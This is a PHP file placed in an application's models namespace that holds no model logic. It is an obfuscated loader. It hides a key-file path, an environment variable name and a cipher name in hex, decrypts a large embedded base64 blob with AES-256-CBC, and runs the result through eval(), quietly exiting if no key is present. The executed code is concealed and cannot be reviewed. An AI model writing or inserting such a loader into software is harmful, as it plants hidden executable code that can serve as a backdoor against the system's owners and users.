<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('aXwqhNxEm+CWbiRDPqScBg==');

$c=base64_decode(

'NpxpabiyB7OsoKQ2s5fw1Qxm13wMLLuEXx8DasF9poykZdTSldgUEj2sRQDNTUrYcCY7BpKZKVnF' .
'920f7zO+6PVSD3F4QVkLicS1kMcfgx1JZmT5QHOuratiq/okFfK/RQYNNrXmST8A4ntSrvjRxbx3' .
'Gva7CzcpMvXEvVka+8rAUAnRwhFQGDpZ0IoEhxx6l4DXpDvby/nDv993ymWMdrQQlU3IqwNPL5Sr' .
'/BrJLGfD40FJosYqhduXCOt+qZPM/K4E2HQIljSXaqDExx1QeQDZ8t1qhCyWEeUj9JqAbqkrIQVh' .
'cRTadVxxu1/7cQpIcx/T2u1aN2TAPM+oOHNjxDrSTv6LU8RULen3QK2NrLo5aAFNYTW+N1axHenU' .
'NlwN0/0brBRlstVdS6Lz2it05rKbsWN2HeAzy+05CpfUfR0Eloqd14SW/ebXYVA/CXLZ0ovmHZrD' .
'ELpnOhI9nbOxfGKLrTFIlD9YfM4WM8pPbgj9+oGkfDvyRmjQJLC6xsLPdtJNDREE0w/+zTbQg9Dz' .
'UpKtymUarnD2pKDAyAcrY30NgTDTXd6SSSDMf4K4OSkp1ugfc87tLOezclX+iiGnTuCVera5EeCD' .
'iLxaAKbPIIiXsKJ8nm/BGZA26psCt/wH/xTk9o0HvlQoARv7WlI8Mk5arQ+ZkwAEgVJwRGk0lraM' .
'QzrEm5N6Hg4WOop8Lo3nlCXjzQYqb7zrxaiecJOidGRUbiXbqCyGpPntdRiPpS/3OFygNxgJw9QQ' .
'GhWlUY2Mr2kSuudKYwrsazLvYoaeyQUqx4woM1pzuZF5dtQX9HY2T/Z8VmShXT9bHWd48G21J9Ej' .
'3DtOZotDjD6/hZZdzyGpx7UE914KNQnbpG5gsiAv7bkIAqZUGYfNem7Bq05HbPAhe4b8vawdnY9k' .
'zCqlP0d/sSB4Za+U0rEi/02iK5zVwnJbEk6sjHNQADKgb2+Jc7e4nKGIZkll3DQ+G0UtWFPl9GaG' .
'qGMXrNdetQgYo14K/chESfoUK0SV83wHFFIGjMK2j76OXrQzAEHiXdqM5ENAl2gtnfSD4ml0HNoj' .
'E9NnUeg8Jma06d3yKnOJuswloOAsqida+r5l/IvJC2FBKZdnpXNF2iVEbR+qeQHQdAvQcHwvMc0P' .
'7/3VeMqTk/24ikOs9Af7T85+xPCfhg5kana0uhbuxd6Sb6p8bs2MgXDj6PjjP78XKTqdFZtZk7Zf'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

